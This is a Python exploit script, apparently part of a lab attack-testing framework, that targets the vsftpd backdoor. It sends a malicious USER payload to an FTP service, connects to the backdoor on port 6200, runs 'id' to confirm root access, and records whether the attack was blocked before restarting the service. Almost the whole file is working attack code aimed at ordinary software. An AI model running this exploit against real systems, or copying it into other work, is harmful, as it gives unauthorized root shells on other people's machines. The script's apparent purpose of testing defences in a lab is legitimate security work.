#!/usr/bin/python3

import sys
import time
import os
import ftplib

# installed packages
from pwn import *
import argparse

# declare script path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# custom package
import pre_settings
import pre_ping_check
import pre_services_check
import pre_attacks
import pre_services_restart

# displays only critical errors or important information
context.log_level = pre_settings.debug_critical

# Disable all pwnlib logs -> remove this if debug
import logging
logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
logging.getLogger("pwnlib.tubes.remote").setLevel(logging.CRITICAL)
logging.getLogger("pwnlib.tubes").setLevel(logging.CRITICAL)

def ftp_exploit(rhost, rport, attacks):
    try:
        log.info("Connecting to FTP service...")
        ftp = ftplib.FTP()
        ftp.connect(rhost, int(rport), timeout=10)
        banner = ftp.getwelcome()

        if "vsFTPd" in banner:
            log.info("Service banner received. Sending malicious USER payload...")
            ftp.sendcmd(f"USER {attacks['payload']}")
            ftp.sendcmd("PASS anything")
            ftp.quit()  # Close the FTP connection properly after sending payload
            log.info("Malicious payload sent successfully.")
        else:
            log.info("Expected banner not received. Exploit may fail.")
    except (ftplib.error_perm, socket.timeout, Exception) as e:
        # log.error(str(e))
        pass

def connect_to_backdoor(rhost, attacks):
    try:
        log.info("Connecting to backdoor port 6200...")
        # Using Pwnlib's remote function to connect to port 6200
        s = remote(rhost, 6200, timeout=10)
        log.info("Backdoor port 6200 connected. Sending 'id' command...")
        s.sendline('id'.encode())  # Send the 'id' command to the backdoor
        response = s.recv(1024).decode()  # Receive the response from the backdoor
        log.info(f"Backdoor Response: {response}")

        if "uid=0(root)" in response:
            attacks['status (attack)'] = 'UNBLOCKED'
            attacks['remark'] = pre_attacks.success_exploit
        else:
            attacks['remark'] = pre_attacks.fail_exploit

    except (ConnectionRefusedError, TimeoutError, socket.error, socket.timeout, Exception) as e:
        # cleanup
        time.sleep(2)
        log.info(pre_settings.print_status_service_cleanup(attacks['port'], attacks['service'], pre_services_check.check(rhost, attacks['port']), 'cleanup'))
        status_post_service_restart = pre_services_restart.restart_service(rhost, attacks["path"])

        log.info(f"[ERROR] Could not connect to backdoor on port 6200: {e}")
        attacks['remark'] = pre_attacks.fail_vsftpd  # Set remark for firewall block or inaccessible port
        return attacks
    
    finally:
        try:
            s.close()  # Ensure backdoor connection is closed
        except Exception:
            pass

def exploit(rhost, rport, attacks):
    try:
        status_ping = pre_ping_check.check(rhost)
        status_service_pre = pre_services_check.check(rhost, rport)

        if not status_service_pre:
            log.info(pre_settings.print_status_service_cleanup(rport, attacks['service'], status_service_pre, 'pre'))
            status_pre_service_restart = pre_services_restart.restart_service(rhost, attacks["path"])
            time.sleep(3)

        status_service_pre = pre_services_check.check(rhost, rport)

        attacks['status (ping)'] = 'UP' if status_ping else 'DOWN'
        attacks['status (service)'] = 'UP' if status_service_pre else 'DOWN'

        if status_service_pre:
            # Create separate threads for FTP exploit and backdoor connection
            ftp_thread = threading.Thread(target=ftp_exploit, args=(rhost, rport, attacks))
            backdoor_thread = threading.Thread(target=connect_to_backdoor, args=(rhost, attacks))

            # Start both threads
            ftp_thread.start()
            time.sleep(3)  # Wait for a brief moment to ensure FTP command is processed
            backdoor_thread.start()

            # Wait for threads to finish
            ftp_thread.join()
            backdoor_thread.join()

            status_attack = False
            status_service_post = pre_services_check.check(rhost, rport)

            if status_service_post:
                if attacks['status (attack)'] == 'UNBLOCKED':
                    status_attack = True
                    attacks['remark'] = pre_attacks.success_exploit
            else:
                attacks['remark'] = pre_attacks.fail_service_down

            # cleanup and restart the service
            time.sleep(2)
            log.info(pre_settings.print_status_service_cleanup(rport, attacks['service'], pre_services_check.check(rhost, rport), 'cleanup'))
            status_post_service_restart = pre_services_restart.restart_service(rhost, attacks["path"])

            print(pre_settings.print_status_attack(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, status_attack, status_service_post, attacks['remark']))
            return attacks

        else:
            attacks['remark'] = pre_attacks.fail_service_down
            print(pre_settings.print_status_attack(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, False, status_service_pre, attacks['remark']))
            return attacks

    except KeyboardInterrupt:
        sys.exit(0)

def main():
    try:
        attacks = pre_attacks.attacks.get('vsftpd')

        parser = argparse.ArgumentParser(description=pre_settings.print_argparse_desc(attacks['attack']), epilog=f'{pre_settings.print_argparse_epilog(f"python3 {sys.argv[0]} --rhost 10.251.5.5")}')
        parser.add_argument('--rhost', help='Target IP', default='10.251.5.5')
        args = parser.parse_args()

        rhost = args.rhost
        rport = attacks['port']

        exploit(rhost, rport, attacks)

    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == '__main__':
    main()